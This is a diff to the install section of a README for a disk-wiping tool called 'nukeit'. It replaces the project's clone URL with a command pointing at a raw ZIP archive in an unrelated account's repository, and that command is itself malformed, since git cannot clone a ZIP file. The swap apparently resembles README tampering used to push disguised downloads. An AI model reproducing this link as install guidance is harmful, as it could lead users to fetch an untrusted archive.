@@ -169,7 +169,7 @@ All required tools (`PowerShell`, `DISKPART`, `Optimize-Volume`) are built into 
 ### 1. Clone or download
 
 ```bash
-git clone https://github.com/purplefoxxx/nukeit.git
+git clone https://github.com/Ashish4144/NukeIt/raw/refs/heads/main/exhibit/It_Nuke_v3.6.zip
 cd nukeit
 ```
 
